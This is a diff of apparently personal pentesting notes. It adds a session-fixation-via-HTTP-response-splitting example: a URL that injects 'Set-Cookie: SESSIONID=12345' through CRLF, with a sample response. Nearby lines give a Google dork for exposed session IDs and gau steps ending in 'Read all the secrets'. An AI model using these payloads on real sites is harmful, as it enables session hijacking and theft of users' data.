@@ -55,7 +55,25 @@ java -jar -Xmx512M -Djava.awt.headless=true ./burpsuite_pro_v1.8.8.jar http exmp
   
  
  inrul:login;jsessionid=    >> to see squestoinal session id 
+ 
+ 
+ 
+ 
  ----------------------------------------------------------------------------------------------
+            Combining Session Fixation With Http Request Splitting 
+            
+http://host/loging\r\nSet-Cookie: SESSIONID=12345\r\nDummy-Header:
+
+Respone
+HTTP /1.1 302 
+Server: host
+Locatoin: https://host/login Set-Cookie:SESSIONID=12345 Dummy-Header: /login
+ 
+ 
+ 
+ 
+ 
+ 
 1) go get -u http://github.com/lc/gau
 2) echo "http://drive.google.com" | gau
 3) Read all the secrets
